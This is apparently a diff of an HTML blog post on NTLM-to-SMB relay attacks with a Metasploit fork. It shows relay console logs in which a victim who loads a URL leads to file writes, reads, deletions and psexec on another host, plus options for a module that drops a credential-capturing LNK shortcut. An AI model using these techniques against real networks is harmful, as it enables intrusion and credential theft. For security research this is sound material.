@@ -24,22 +24,22 @@
 &lt;p&gt;You can pull the fork w/ branch from here: &lt;a href=&#34;https://github.com/webstersprodigy/metasploit-framework/tree/module-http-ntlmrelay&#34;&gt;https://github.com/webstersprodigy/metasploit-framework/tree/module-http-ntlmrelay&lt;/a&gt;&lt;/p&gt;
 &lt;p&gt;And as soon as you do you can start doing this (&lt;strong&gt;&lt;em&gt;using the example resource file to put a file, cat it out, enum shares available, list files on a share, then psexec all from a single URL being loaded&lt;/em&gt;&lt;/strong&gt;):&lt;/p&gt;
 &lt;p&gt;163 address is the Victim I tricked into loading a URL and 182 is the system I want to get onto. This is an HTTP request resulting in a SMB Relay&amp;rsquo;d auth. It looks as though multiple targets can be used as relay targets but I haven&amp;rsquo;t tested this out yet.&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;[*] 172.16.10.163 http_ntlmrelay - NTLM Request &#39;/smb_put&#39; from 172.16.10.163:52327
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;[*] 172.16.10.163 http_ntlmrelay - NTLM Request &amp;#39;/smb_put&amp;#39; from 172.16.10.163:52327
 [*] 172.16.10.163 http_ntlmrelay - Beginning NTLM Relay...
 [*] 172.16.10.163 http_ntlmrelay - SMB auth relay succeeded
 [*] 172.16.10.163 http_ntlmrelay - File \\172.16.10.182\c$\secret.txt written
-[*] 172.16.10.163 http_ntlmrelay - NTLM Request &#39;/smb_get&#39; from 172.16.10.163:52328
+[*] 172.16.10.163 http_ntlmrelay - NTLM Request &amp;#39;/smb_get&amp;#39; from 172.16.10.163:52328
 [*] 172.16.10.163 http_ntlmrelay - Beginning NTLM Relay...
 [*] 172.16.10.163 http_ntlmrelay - SMB auth relay succeeded
 [*] 172.16.10.163 http_ntlmrelay - Reading 13 bytes from 172.16.10.182
 [*] 172.16.10.163 http_ntlmrelay - ----Contents----
 [*] 172.16.10.163 http_ntlmrelay - hi ima secret
 [*] 172.16.10.163 http_ntlmrelay - ----End Contents----
-[*] 172.16.10.163 http_ntlmrelay - NTLM Request &#39;/smb_enum&#39; from 172.16.10.163:52329
+[*] 172.16.10.163 http_ntlmrelay - NTLM Request &amp;#39;/smb_enum&amp;#39; from 172.16.10.163:52329
 [*] 172.16.10.163 http_ntlmrelay - Beginning NTLM Relay...
 [*] 172.16.10.163 http_ntlmrelay - SMB auth relay succeeded
 [*] 172.16.10.163 http_ntlmrelay - Shares enumerated 172.16.10.182 IPC$ ADMIN$ C$
-[*] 172.16.10.163 http_ntlmrelay - NTLM Request &#39;/smb_ls&#39; from 172.16.10.163:52330
+[*] 172.16.10.163 http_ntlmrelay - NTLM Request &amp;#39;/smb_ls&amp;#39; from 172.16.10.163:52330
 [*] 172.16.10.163 http_ntlmrelay - Beginning NTLM Relay...
 [*] 172.16.10.163 http_ntlmrelay - SMB auth relay succeeded
 [*] 172.16.10.163 http_ntlmrelay - Listed 13 files from 172.16.10.182c$
@@ -55,11 +55,11 @@
 [*] 172.16.10.163 http_ntlmrelay - Windows
 [*] 172.16.10.163 http_ntlmrelay - Users
 [*] 172.16.10.163 http_ntlmrelay - Program Files
-[*] 172.16.10.163 http_ntlmrelay - NTLM Request &#39;/smb_rm&#39; from 172.16.10.163:52332
+[*] 172.16.10.163 http_ntlmrelay - NTLM Request &amp;#39;/smb_rm&amp;#39; from 172.16.10.163:52332
 [*] 172.16.10.163 http_ntlmrelay - Beginning NTLM Relay...
 [*] 172.16.10.163 http_ntlmrelay - SMB auth relay succeeded
 [*] 172.16.10.163 http_ntlmrelay - File \\172.16.10.182\c$\secret.txt deleted
-[*] 172.16.10.163 http_ntlmrelay - NTLM Request &#39;/smb_pwn&#39; from 172.16.10.163:52333
+[*] 172.16.10.163 http_ntlmrelay - NTLM Request &amp;#39;/smb_pwn&amp;#39; from 172.16.10.163:52333
 [*] 172.16.10.163 http_ntlmrelay - Beginning NTLM Relay...
 [*] 172.16.10.163 http_ntlmrelay - SMB auth relay succeeded
 [*] 172.16.10.163 http_ntlmrelay - Obtraining a service manager handle...
@@ -94,13 +94,13 @@
 &lt;p&gt;&lt;strong&gt;The Video:&lt;/strong&gt;&lt;/p&gt;
 &lt;center&gt;&lt;iframe align=center width=&#34;560&#34; height=&#34;315&#34; src=&#34;//www.youtube.com/embed/FxekUPY5ojU&#34; frameborder=&#34;0&#34; allowfullscreen&gt;&lt;/iframe&gt;&lt;/center&gt;
 &lt;p&gt;I have created a post module to automate the process of creating and uploading the LNK file (so you don&amp;rsquo;t have to have a Windows box lying around). Here it is in action:&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;Module options (post/windows/escalate/droplnk):
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Module options (post/windows/escalate/droplnk):
 
    Name          Current Setting  Required  Description
    ----          ---------------  --------  -----------
-   ICONFILENAME  icon.png         yes       File name on LHOST&#39;s share
+   ICONFILENAME  icon.png         yes       File name on LHOST&amp;#39;s share
    LHOST         192.168.2.16     yes       Host listening for incoming SMB/WebDAV traffic
-   LNKFILENAME   Words.lnk        yes       Shortcut&#39;s filename
+   LNKFILENAME   Words.lnk        yes       Shortcut&amp;#39;s filename
    SESSION       1                yes       The session to run this module on.
    SHARENAME     share1           yes       Share name on LHOST
 
@@ -129,7 +129,7 @@
 &lt;/ul&gt;
 &lt;p&gt;These steps can get you noticed in almost every way, so it&amp;rsquo;s not recommended, I just did it as a PoC. I mean how cool is it to remotely exploit SMB vulns ;-)&lt;/p&gt;
 &lt;p&gt;The other thing is, administrators are becoming much more rare as years move along and people use lower priv users for their daily tasks, so there are currently feature requests in to the Metasploit project to make it so when you get SMB_Relay correctly forwarding good credentials, even if they aren&amp;rsquo;t admin and you cannot get code execution it would be nice to be able to go through the files that person has access to on the targeted system / file share. A final pipe dream of this post is to have a multi-threaded smb_relay that 2, 3 or even 10 servers can be targeted with the relayed authentication.&lt;/p&gt;
-&lt;p&gt;just saying&#39;…. /me nudges the Metasploit devs…&lt;/p&gt;
+&lt;p&gt;just saying&amp;rsquo;…. /me nudges the Metasploit devs…&lt;/p&gt;
 &lt;h3 id=&#34;references&#34;&gt;References:&lt;/h3&gt;
 &lt;h4 id=&#34;smb_relay-references&#34;&gt;SMB_Relay References:&lt;/h4&gt;
 &lt;ul&gt;
